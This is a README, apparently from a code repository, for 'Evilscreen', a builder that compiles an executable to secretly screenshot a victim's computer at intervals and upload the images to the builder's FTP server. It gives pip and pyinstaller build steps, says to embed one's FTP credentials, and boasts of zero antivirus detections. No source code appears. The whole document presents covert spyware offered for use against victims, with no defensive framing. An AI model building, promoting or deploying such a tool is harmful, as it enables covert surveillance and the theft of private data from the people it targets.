# Evilscreen


A new builder to create a evil executable program that will take screenshots every wanted seconds on a victim computer, sending them on a ftp server.

![image](https://user-images.githubusercontent.com/63863060/162635818-77cee8e3-f815-4719-95c2-524e0e59a61e.png)


![image](https://user-images.githubusercontent.com/63863060/162635902-cff6d72d-3b1d-4c6a-b056-0ff4f9ebd39e.png)


![image](https://user-images.githubusercontent.com/63863060/162635860-a050bc67-be1a-4efc-86d6-49ed4b218d11.png)


![image](https://user-images.githubusercontent.com/63863060/162635850-6f0e822f-17fc-4211-8b53-ea6fce2e41bf.png)


# Pre-needs


The builder is using pyinstaller to compile the python program, it means you need to have all the import installed with pip.
I added them in the requirements.txt file, after installing python and pip on your computer, adding it to path try :


pip install -r requirements.txt


+ (to be 100% sure)

pip install pathlib

pip install ftplib

pip install shutil

pip install getpass


# How to make it work


python evilscreen.py or compile it as an executable using pyinstaller --onefile evilscreen.py

build it using your ftp server credentials


# Detections


The program has 0 detections by anti-viruses which is kinda cool. also reduced a lot file size from 60mb to 17mb.


![image](https://user-images.githubusercontent.com/63863060/162635835-fd4251e9-3590-4494-8632-2240900b5833.png)



# Project used


https://github.com/loutchoo/SilentScreenshotFtp
